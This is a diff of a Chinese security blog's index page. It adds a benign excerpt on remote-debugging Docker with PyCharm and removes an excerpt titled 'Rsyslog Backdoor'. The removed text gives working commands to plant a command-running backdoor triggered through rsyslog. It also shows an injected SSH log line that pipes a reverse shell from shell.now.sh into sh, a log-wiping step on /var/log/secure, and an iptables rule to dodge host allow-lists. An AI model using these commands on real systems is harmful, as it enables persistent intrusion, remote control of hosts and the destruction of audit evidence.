@@ -117,6 +117,82 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/12/13/python-debug.html" >Pycharm远程调试Docker</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-12-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>调试的流水账:</p>
+<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没毛病就表示安装成功。</p>
+<p>这个pycharm的包一般在这个目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后配置pycharm:</p>
+<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
+
+Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
+
+添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
+
+Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
+	
+
+	</div>
+  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>调试的流水账:</p>
+<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没毛病就表示安装成功。</p>
+<p>这个pycharm的包一般在这个目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后配置pycharm:</p>
+<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
+
+Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
+
+添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
+
+Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
+	
+	</div>
+  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2019/10/23/php-eval-proxy.html" >PHP Eval HTTP Proxy</a>
 		</h3>
 		</div>
@@ -523,80 +599,6 @@ class BurpExtender(IBurpExtender, IHttpListener):
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/07/21/rsyslog-backdoor.html" >Rsyslog Backdoor</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-07-21  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
-<h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
-chmod 755 &#x2F;bin&#x2F;atg
-
-echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf
-
-重启生效(Centos用下面的systemctl):
-&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
-systemctl restart rsyslog
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
-kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
-<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
-<h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
-chmod 755 &#x2F;bin&#x2F;atg
-
-echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf
-
-重启生效(Centos用下面的systemctl):
-&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
-systemctl restart rsyslog
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
-kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
-<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -648,7 +650,7 @@ kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>6</span></a></li>
+			<li><a href="/categories/Java/">Java<span>7</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -675,6 +677,10 @@ kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
       </li>
     
@@ -688,10 +694,6 @@ kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span
     
       <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
       </li>
     
   </ul>
